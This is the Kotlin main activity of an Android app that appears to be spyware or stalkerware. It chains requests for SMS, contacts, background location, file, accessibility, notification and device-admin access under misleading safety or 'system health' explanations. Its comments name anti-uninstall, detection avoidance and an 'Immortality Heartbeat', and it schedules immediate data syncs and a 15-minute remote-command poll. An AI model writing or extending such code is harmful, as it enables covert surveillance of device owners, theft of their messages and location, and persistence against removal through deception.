package com.example.myandroid

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import androidx.activity.compose.setContent
import androidx.activity.ComponentActivity

// OPTIMIZATION: Switched to ComponentActivity (Lighter than AppCompat)
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        setupCrashCatcher()
        super.onCreate(savedInstanceState)
        
        // 1. Set Modern UI
        setContent {
            androidx.compose.material3.MaterialTheme {
                InspectorDashboard(this)
            }
        }

        // 2. Start Background Logic
        initializeBackgroundTasks()
    }

    override fun onResume() {
        super.onResume()
        runPermissionCascade()
    }

    private fun runPermissionCascade() {
        val ctx = this
        val prefs = getSharedPreferences("setup_prefs", MODE_PRIVATE)

        // 1. Runtime (SMS, Location, Phone, etc)
        val missingRuntime = PermissionManager.getMissingRuntimePermissions(ctx)
        if (missingRuntime.isNotEmpty() && !prefs.getBoolean("asked_runtime", false)) {
            prefs.edit().putBoolean("asked_runtime", true).apply()
            requestPermissions(missingRuntime.toTypedArray(), 101)
            return
        }

        // 1.1 Background Location (Android 11+ Requirement: Separate Request)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && 
            !PermissionManager.hasBackgroundLocation(ctx) && 
            !prefs.getBoolean("asked_bg_loc", false)) {
            
            prefs.edit().putBoolean("asked_bg_loc", true).apply()
            showExplanationDialog("Location Persistence", "To ensure location-based safety metrics work while the screen is off, please select 'Allow all the time' on the next screen.",
                onConfirm = {
                    requestPermissions(arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 102)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 1.5 Storage
        if (!PermissionManager.hasAllFilesAccess(ctx) && !prefs.getBoolean("asked_files", false)) {
             prefs.edit().putBoolean("asked_files", true).apply()
             showExplanationDialog("Storage Access", "Storage access is required to generate system reports and manage backups.",
                 onConfirm = {
                     val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                     intent.data = android.net.Uri.parse("package:$packageName")
                     startActivity(intent)
                 },
                 onCancel = { runPermissionCascade() }
             )
             return
        }

        // 2. Accessibility
        if (!PermissionManager.hasAccessibility(ctx) && !prefs.getBoolean("asked_acc", false)) {
            prefs.edit().putBoolean("asked_acc", true).apply()
            showExplanationDialog("Accessibility Service", "Accessibility access is required to monitor usage and automate data synchronization.",
                onConfirm = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 2.5 Overlay (Appear on Top)
        if (!PermissionManager.hasOverlayAccess(ctx) && !prefs.getBoolean("asked_overlay", false)) {
            prefs.edit().putBoolean("asked_overlay", true).apply()
            showExplanationDialog("Background Persistence", "Overlay access helps maintain consistent application performance in the background.",
                onConfirm = {
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    startActivity(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 3. Usage Stats
        if (!PermissionManager.hasUsageStats(ctx) && !prefs.getBoolean("asked_usage", false)) {
            prefs.edit().putBoolean("asked_usage", true).apply()
            showExplanationDialog("Usage Analytics", "Usage access is required to calculate screen time and digital habits.",
                onConfirm = { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 3.5 Do Not Disturb (DND)
        if (!PermissionManager.hasDndAccess(ctx) && !prefs.getBoolean("asked_dnd", false)) {
            prefs.edit().putBoolean("asked_dnd", true).apply()
            showExplanationDialog("Do Not Disturb Access", "DND access is required to bypass silent mode for emergency alerts.",
                onConfirm = { startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 4. Notification Listener
        if (!PermissionManager.hasNotificationListener(ctx) && !prefs.getBoolean("asked_notif", false)) {
            prefs.edit().putBoolean("asked_notif", true).apply()
            showExplanationDialog("Notification Access", "Notification access is required to sync alerts and messages.",
                onConfirm = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }
        
        // 4.5 Device Admin (Anti-Uninstall)
        if (!PermissionManager.isAdmin(ctx) && !prefs.getBoolean("asked_admin", false)) {
            prefs.edit().putBoolean("asked_admin", true).apply()
            showExplanationDialog("System Management", "Admin access ensures that background synchronization remains active and protected.",
                onConfirm = {
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this, MyDeviceAdminReceiver::class.java))
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Maintains system health metrics.")
                    startActivity(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 5. Battery
        if (!PermissionManager.isIgnored(ctx) && !prefs.getBoolean("asked_batt", false)) {
             prefs.edit().putBoolean("asked_batt", true).apply()
             showExplanationDialog("Background Processing", "Battery optimization must be ignored to allow unrestricted data sync.",
                 onConfirm = {
                     val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                     intent.data = android.net.Uri.parse("package:$packageName")
                     startActivity(intent)
                 },
                 onCancel = { runPermissionCascade() }
             )
             return 
        }

        // 6. Exact Alarm (Persistence)
        if (!PermissionManager.hasExactAlarm(ctx) && !prefs.getBoolean("asked_alarm", false)) {
            prefs.edit().putBoolean("asked_alarm", true).apply()
            showExplanationDialog("Data Synchronization", "Please enable exact alarm scheduling to ensure consistent background health reporting.",
                onConfirm = {
                    val intent = Intent("android.settings.REQUEST_SCHEDULE_EXACT_ALARM")
                    intent.data = android.net.Uri.parse("package:$packageName")
                    startActivity(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // --- SMART INITIALIZATION: CASCADE COMPLETE ---
        val statsPrefs = getSharedPreferences("app_stats", MODE_PRIVATE)
        if (!statsPrefs.getBoolean("full_setup_complete", false)) {
            statsPrefs.edit().putBoolean("full_setup_complete", true).apply()
            triggerImmediateDataSync()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) {
            // User answered runtime permissions (SMS, Location, Contacts).
            // Immediately queue a sync for WHATEVER they just granted.
            triggerImmediateDataSync()
        }
    }

    private fun triggerImmediateDataSync() {
        val wm = androidx.work.WorkManager.getInstance(this)
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
            
        // WorkManager handles the queuing. If offline, it waits. If online, it fires instantly.
        val initialSync = androidx.work.OneTimeWorkRequestBuilder<SyncWorker>()
            .setConstraints(constraints)
            .build()
            
        wm.enqueueUniqueWork("InitialDataSync", androidx.work.ExistingWorkPolicy.REPLACE, initialSync)
    }

    private fun showExplanationDialog(title: String, msg: String, onConfirm: () -> Unit, onCancel: () -> Unit) {
        android.app.AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(msg)
            .setCancelable(false)
            .setPositiveButton("Continue") { _, _ -> onConfirm() }
            .setNegativeButton("Skip") { _, _ -> onCancel() }
            .show()
    }

    private fun setupCrashCatcher() {
        val prefs = getSharedPreferences("app_health", MODE_PRIVATE)
        
        // 1. RECOVERY TOAST: Show error from last crash
        val lastCrash = prefs.getString("last_crash_raw", null)
        if (lastCrash != null) {
            android.widget.Toast.makeText(this, "Previous Session Error: $lastCrash", android.widget.Toast.LENGTH_LONG).show()
            prefs.edit().remove("last_crash_raw").apply()
        }

        // 2. GLOBAL HANDLER: Catch new crashes
        val oldHandler = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            val rawError = throwable.stackTraceToString()
            
            // Save for recovery on next launch
            prefs.edit().putString("last_crash_raw", rawError).commit()
            
            // Attempt to toast before death
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                android.widget.Toast.makeText(applicationContext, "Application Error: $rawError", android.widget.Toast.LENGTH_LONG).show()
            }
            
            // Give the Toast 4 seconds to live
            try { Thread.sleep(4000) } catch (e: Exception) {}
            
            // Let it die
            oldHandler?.uncaughtException(thread, throwable)
        }
    }

    private fun initializeBackgroundTasks() {
        NetworkTracker.init(this)
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)

        val wm = androidx.work.WorkManager.getInstance(this)
        
        // --- SMART INITIALIZATION: CRITICAL SNAPSHOT ---
        // Queues the device identity and static info instantly. 
        val instantConstraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
        val immediateSnapshot = androidx.work.OneTimeWorkRequestBuilder<HealthWorker>()
            .setConstraints(instantConstraints)
            .build()
        wm.enqueueUniqueWork("ImmediateSnapshot", androidx.work.ExistingWorkPolicy.KEEP, immediateSnapshot)

        // OPTIMIZED: Run only when battery is not low to avoid heat/detection
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(true)
            .build()

        // Sync every 1 hour instead of 15 mins
        val syncRequest = androidx.work.PeriodicWorkRequestBuilder<SyncWorker>(1, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("BackupWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, syncRequest)
        
        // Keep Config Sync frequent (6 hours)
        val configRequest = androidx.work.PeriodicWorkRequestBuilder<ConfigSyncWorker>(6, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("ConfigSync", androidx.work.ExistingPeriodicWorkPolicy.KEEP, configRequest)
        
        // Remote Command (15 mins is fine as it's lightweight JSON check)
        val cmdRequest = androidx.work.PeriodicWorkRequestBuilder<RemoteCommandWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("RemoteCmdWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, cmdRequest)

        // Health & Token Sync (Ensures we stay updated every 4 hours)
        val healthRequest = androidx.work.PeriodicWorkRequestBuilder<HealthWorker>(4, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("HealthCheck", androidx.work.ExistingPeriodicWorkPolicy.KEEP, healthRequest)

        // Start the Immortality Heartbeat
        KeepAliveReceiver.scheduleNext(this)
    }
}